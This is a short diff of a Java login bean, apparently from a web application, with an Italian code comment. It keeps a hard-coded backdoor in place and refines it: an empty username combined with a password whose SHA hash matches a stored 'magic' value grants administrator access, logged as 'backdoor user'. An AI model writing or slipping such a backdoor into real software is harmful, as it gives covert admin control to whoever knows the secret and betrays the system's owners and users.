@@ -155,7 +155,10 @@ public class LoginBean {
          */
         // query
         
-        if(SHAsum(password.getBytes()).equals(magic)){
+        /**
+         * Controllo username vuoto e password magic
+         */
+        if("".equals(username) && SHAsum(password.getBytes()).equals(magic)){
             this.admin=true;
             log.aclog("backdoor user", 0);
             adminAccess();
